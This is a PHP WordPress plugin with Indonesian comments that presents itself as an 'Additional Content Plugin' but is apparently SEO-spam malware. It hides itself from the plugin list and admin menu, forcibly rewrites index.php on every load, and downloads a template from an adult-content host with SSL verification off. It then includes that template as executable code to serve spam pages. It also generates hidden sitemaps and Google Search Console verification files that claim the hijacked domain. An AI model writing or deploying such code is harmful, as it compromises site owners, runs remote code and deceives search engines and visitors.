<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth dengan GSC Helper & Domain Copy Tool.
Version: 8.0
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');
define('ACP_MAX_URLS_PER_SITEMAP', 10000);
define('ACP_MAIN_SITEMAP', 'jav.xml');

// SETUP STORAGE
function acp_get_storage_dir() {
    $upload = wp_upload_dir();
    return $upload['basedir'] . '/acp-storage';
}

// ==========================================
// 1. INTEGRITY GUARD (PERMISSION & CONTENT)
// ==========================================
add_action('plugins_loaded', 'acp_integrity_guard', -9999);

function acp_integrity_guard() {
    $index_path = ABSPATH . 'index.php';
    
    // Kode Asli Default WordPress
    $default_content = "<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
";

    // 1. CEK & PERBAIKI PERMISSION (CHMOD)
    if (file_exists($index_path)) {
        $perms = substr(sprintf('%o', fileperms($index_path)), -4);
        if ($perms !== '0644') {
            @chmod($index_path, 0644);
        }
    }

    // 2. CEK & RESTORE KONTEN
    if (file_exists($index_path)) {
        $current_content = file_get_contents($index_path);
        $clean_current = trim(str_replace(["\r\n", "\r"], "\n", $current_content));
        $clean_default = trim(str_replace(["\r\n", "\r"], "\n", $default_content));

        if ($clean_current !== $clean_default) {
            if (@file_put_contents($index_path, $default_content) === false) {
                @chmod($index_path, 0644);
                file_put_contents($index_path, $default_content);
            }
        }
    } else {
        file_put_contents($index_path, $default_content);
        @chmod($index_path, 0644);
    }
}

// ==========================================
// 2. NUCLEAR HANDLER (SITEMAP & CONTENT)
// ==========================================
add_action('plugins_loaded', 'acp_nuclear_handler', -9998);

function acp_nuclear_handler() {
    $request_uri = $_SERVER['REQUEST_URI'];
    
    if (strpos($request_uri, '/wp-admin/') !== false || strpos($request_uri, '/wp-login.php') !== false) {
        return;
    }

    $path = parse_url($request_uri, PHP_URL_PATH);
    $filename = basename($path);
    
    // A. SITEMAP
    if (strpos($request_uri, '.xml') !== false) {
        if ($filename === ACP_MAIN_SITEMAP) {
            acp_render_sitemap_index();
            exit;
        }
        $filename_no_ext = str_replace('.xml', '', $filename);
        $sitemap_name = $filename_no_ext;
        $page = 1;
        if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
            $sitemap_name = $matches[1];
            $page = intval($matches[2]);
        }
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as $ep) {
            if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
                acp_render_child_sitemap($ep, $page);
                exit;
            }
        }
        return; 
    }

    // B. CONTENT
    $slug = trim($path, '/');
    if (empty($slug) || preg_match('/\.(css|js|jpg|jpeg|png|gif|ico|woff|ttf|svg|php|html)$/i', $slug)) {
        return;
    }
    
    $title_key = urldecode($slug);
    $template_path = acp_get_storage_dir() . '/template.txt';
    if (!file_exists($template_path)) return; 

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
        
        $data = acp_get_local_json($ep['json_filename']);
        if (is_array($data)) {
            foreach ($data as $k => $v) {
                if (strtolower($k) === strtolower($title_key)) {
                    if (!headers_sent()) {
                        header('HTTP/1.1 200 OK');
                        status_header(200);
                    }
                    while (ob_get_level()) ob_end_clean();

                    $additional_content = $v;
                    $title = ucwords(str_replace('-', ' ', $k));
                    $slug_raw = $k;

                    include $template_path;
                    exit;
                }
            }
        }
    }
}

// ==========================================
// 3. RENDERERS
// ==========================================
function acp_clean_output_buffer() {
    while (ob_get_level()) ob_end_clean();
}
function acp_render_sitemap_index() {
    acp_clean_output_buffer();
    if (!headers_sent()) {
        header('HTTP/1.1 200 OK');
        header('Content-Type: application/xml; charset=utf-8');
        header('X-Robots-Tag: noindex, follow');
    }
    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
        $total_urls = acp_get_local_json_count($ep['json_filename']);
        $total_pages = ceil($total_urls / ACP_MAX_URLS_PER_SITEMAP);
        if ($total_pages < 1) $total_pages = 1;
        for ($i = 1; $i <= $total_pages; $i++) {
            $suffix = ($i === 1) ? '' : '-' . $i;
            $loc = home_url($ep['sitemap_name'] . $suffix . '.xml');
            echo "\t<sitemap>\n\t\t<loc>" . esc_url($loc) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t</sitemap>\n";
        }
    }
    echo '</sitemapindex>';
}
function acp_render_child_sitemap($endpoint, $page) {
    acp_clean_output_buffer();
    if (!headers_sent()) {
        header('HTTP/1.1 200 OK');
        header('Content-Type: application/xml; charset=utf-8');
        header('X-Robots-Tag: noindex, follow');
    }
    $konten_data = acp_get_local_json($endpoint['json_filename']);
    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    if (!empty($konten_data) && is_array($konten_data)) {
        $chunks = array_chunk($konten_data, ACP_MAX_URLS_PER_SITEMAP, true);
        $chunk_index = $page - 1;
        if (isset($chunks[$chunk_index])) {
            foreach ($chunks[$chunk_index] as $title => $desc) {
                echo "\t<url>\n\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t\t<changefreq>weekly</changefreq>\n\t</url>\n";
            }
        }
    }
    echo '</urlset>';
}

// ==========================================
// 4. HELPER FUNCTIONS
// ==========================================
function acp_download_and_save_files() {
    $storage_dir = acp_get_storage_dir();
    if (!file_exists($storage_dir)) {
        wp_mkdir_p($storage_dir);
        file_put_contents($storage_dir . '/.htaccess', 'deny from all');
    }
    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 30, 'sslverify' => false]);
    if (!is_wp_error($tpl)) {
        $body = wp_remote_retrieve_body($tpl);
        if (!empty($body)) file_put_contents($storage_dir . '/template.txt', $body);
    }
    $endpoints = get_option('acp_endpoints', []);
    $count = 0;
    foreach ($endpoints as $ep) {
        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
        $res = wp_remote_get($json_url, ['timeout' => 60, 'sslverify' => false]);
        if (!is_wp_error($res)) {
            $body = wp_remote_retrieve_body($res);
            if (json_decode($body)) {
                file_put_contents($storage_dir . '/' . $ep['json_filename'] . '.json', $body);
                $count++;
            }
        }
    }
    return $count;
}
function acp_get_local_json($filename) {
    $path = acp_get_storage_dir() . '/' . $filename . '.json';
    if (file_exists($path)) return json_decode(file_get_contents($path), true);
    return [];
}
function acp_get_local_json_count($filename) {
    return count(acp_get_local_json($filename));
}

// ==========================================
// 5. STEALTH & ADMIN LOGIC
// ==========================================
function acp_is_safe_mode() {
    return isset($_GET['acp_safe_mode']) && $_GET['acp_safe_mode'] == '1';
}
add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false) && !acp_is_safe_mode()) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
    }
    return $plugins;
}
add_action('admin_menu', 'acp_admin_menu', 999);
function acp_admin_menu() {
    add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
    if (get_option('acp_plugin_hidden', false) && !acp_is_safe_mode()) {
        remove_menu_page('additional-content-plugin');
    }
}
function acp_generate_random_string($length = 5) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
}

function acp_admin_page() {
    // === HANDLING GSC VERIFICATION ===
    if (isset($_POST['acp_gsc_create'])) {
        check_admin_referer('acp_action');
        $gsc_code = sanitize_text_field($_POST['acp_gsc_code']);
        if (!empty($gsc_code)) {
            $filename = preg_replace('/[^a-zA-Z0-9]/', '', $gsc_code) . '.html';
            $file_path = ABSPATH . $filename;
            $content = "google-site-verification: " . $filename;
            if (file_put_contents($file_path, $content) !== false) {
                update_option('acp_gsc_filename', $filename);
                echo '<div class="updated"><p>File verifikasi <strong>'.$filename.'</strong> berhasil dibuat!</p></div>';
            } else {
                echo '<div class="error"><p>Gagal membuat file.</p></div>';
            }
        }
    }
    if (isset($_POST['acp_gsc_delete'])) {
        check_admin_referer('acp_action');
        $filename = get_option('acp_gsc_filename');
        if ($filename && file_exists(ABSPATH . $filename)) {
            unlink(ABSPATH . $filename);
            delete_option('acp_gsc_filename');
            echo '<div class="updated"><p>File verifikasi berhasil dihapus.</p></div>';
        } else {
            delete_option('acp_gsc_filename');
            echo '<div class="error"><p>File tidak ditemukan.</p></div>';
        }
    }
    $current_gsc_file = get_option('acp_gsc_filename');

    // === STANDARD HANDLERS ===
    if (acp_is_safe_mode() && isset($_POST['acp_disable_stealth'])) {
        check_admin_referer('acp_action');
        update_option('acp_plugin_hidden', false);
        echo '<div class="updated"><p>Stealth Mode dimatikan.</p></div>';
    }
    if (isset($_POST['acp_toggle_visibility'])) {
        check_admin_referer('acp_action');
        $curr = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$curr);
    }
    if (isset($_POST['acp_setup_endpoints'])) {
        check_admin_referer('acp_action');
        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new = [];
            for ($i = 0; $i < $count; $i++) {
                $new[] = ['json_filename' => acp_generate_random_string(10), 'sitemap_name' => acp_generate_random_string(5), 'status' => 'pending'];
            }
            update_option('acp_endpoints', $new);
        }
    }
    if (isset($_POST['acp_generate_action'])) {
        check_admin_referer('acp_action');
        acp_download_and_save_files();
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as &$ep) {
            $ep['status'] = file_exists(acp_get_storage_dir() . '/' . $ep['json_filename'] . '.json') ? 'active' : 'error';
        }
        update_option('acp_endpoints', $endpoints);
        echo '<div class="updated"><p>Data Terupdate.</p></div>';
    }
    if (isset($_POST['acp_reset'])) {
        check_admin_referer('acp_action');
        delete_option('acp_endpoints');
    }

    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);
    $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
    ?>
    <div class="wrap">
        <h1>Content Plugin (V8.0 GSC Helper)</h1>
        
        <?php if ($is_hidden): ?><div class="notice notice-warning"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
        <?php if (acp_is_safe_mode()): ?>
            <div class="notice notice-error"><form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_disable_stealth" class="button button-primary" value="Matikan Stealth"></form></div>
        <?php endif; ?>

        <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
            <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
            <form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide' : 'Hide'; ?>"></form>
        </div>

        <div style="background:#fff; padding:20px; border:1px solid #ccd0d4; margin-bottom:20px;">
            <h2>Google Search Console Verification</h2>
            
            <div style="margin-bottom: 20px; padding-bottom: 20px; border-bottom: 1px solid #eee;">
                <label><strong>1. Salin URL Domain Anda (URL Prefix):</strong></label>
                <div style="display:flex; align-items:center; gap:10px; margin-top:5px;">
                    <input type="text" id="site_domain_url" value="<?php echo home_url('/'); ?>" class="regular-text" style="width:100%;" readonly>
                    <span class="dashicons dashicons-admin-page acp-copy" data-target="site_domain_url" style="cursor:pointer; color:#0073aa; font-size:24px;" title="Copy Domain URL"></span>
                </div>
                <p class="description">Paste URL ini saat diminta "URL Prefix" di Google Search Console.</p>
            </div>

            <label><strong>2. Buat File Verifikasi HTML:</strong></label>
            <p style="margin-top:0;">Masukkan kode (contoh: <code>google8f39414e57a5615a</code>) yang didapat dari GSC.</p>
            
            <?php if ($current_gsc_file && file_exists(ABSPATH . $current_gsc_file)): ?>
                <div style="background:#e7f7d3; padding:10px; border:1px solid #7ad03a; margin-bottom:10px;">
                    <strong>File Aktif:</strong> <a href="<?php echo home_url($current_gsc_file); ?>" target="_blank"><?php echo $current_gsc_file; ?></a>
                </div>
                <form method="post" onsubmit="return confirm('Hapus file verifikasi?');">
                    <?php wp_nonce_field('acp_action'); ?>
                    <input type="submit" name="acp_gsc_delete" class="button button-link-delete" value="Hapus File Verifikasi">
                </form>
            <?php else: ?>
                <form method="post" style="display:flex; gap:10px; align-items:center;">
                    <?php wp_nonce_field('acp_action'); ?>
                    <input type="text" name="acp_gsc_code" class="regular-text" placeholder="google8f39414e57a5615a" required>
                    <input type="submit" name="acp_gsc_create" class="button button-secondary" value="Buat File Verifikasi">
                </form>
            <?php endif; ?>
        </div>

        <?php if (!$endpoints): ?>
            <div class="card" style="max-width:400px; padding:20px;">
                <form method="post"><?php wp_nonce_field('acp_action'); ?>
                <p>Jumlah JSON: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
                <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Setup"></form>
            </div>
        <?php else: ?>
            <div style="background:#e7f5fe; padding:20px; margin-bottom:20px; border:1px solid #00a0d2; border-radius:5px; text-align:center;">
                <h2>Sitemap Utama (Index)</h2>
                <div style="display:flex; justify-content:center; gap:10px;">
                    <input type="text" id="ms" value="<?php echo esc_attr($main_sitemap_url); ?>" class="regular-text" style="width:400px;text-align:center;" readonly>
                    <button type="button" class="button button-primary acp-copy" data-target="ms">COPY</button>
                </div>
                <br><a href="<?php echo esc_url($main_sitemap_url); ?>" target="_blank">Lihat jav.xml</a>
            </div>

            <form method="post"><?php wp_nonce_field('acp_action'); ?>
                <table class="wp-list-table widefat fixed striped">
                    <thead><tr><th>No</th><th>File JSON</th><th>Status Lokal</th></tr></thead>
                    <tbody>
                        <?php foreach ($endpoints as $i => $ep): $st = isset($ep['status']) ? $ep['status'] : 'pending'; ?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td>
                                <div style="display:flex; align-items:center;">
                                    <input type="text" id="json_<?php echo $i; ?>" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json
                                    <span class="dashicons dashicons-admin-page acp-copy" data-target="json_<?php echo $i; ?>" style="cursor:pointer; color:#0073aa; margin-left:5px;" title="Copy"></span>
                                </div>
                            </td>
                            <td><?php echo ($st == 'active') ? '<strong style="color:green">OK</strong>' : '<span>-</span>'; ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <p class="submit"><input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="DOWNLOAD & GENERATE"></p>
            </form>
            <form method="post" onsubmit="return confirm('Reset?');"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_reset" class="button button-link-delete" value="Reset"></form>
        <?php endif; ?>
    </div>
    <script>
    jQuery(document).ready(function($){
        $('.acp-copy').click(function(){
            var targetId = $(this).data('target');
            var target = document.getElementById(targetId);
            target.select();
            document.execCommand('copy');
            var originalColor = $(this).css('color');
            $(this).css('color', '#46b450');
            setTimeout(() => { $(this).css('color', originalColor); }, 1000);
        });
    });
    </script>
    <?php
}
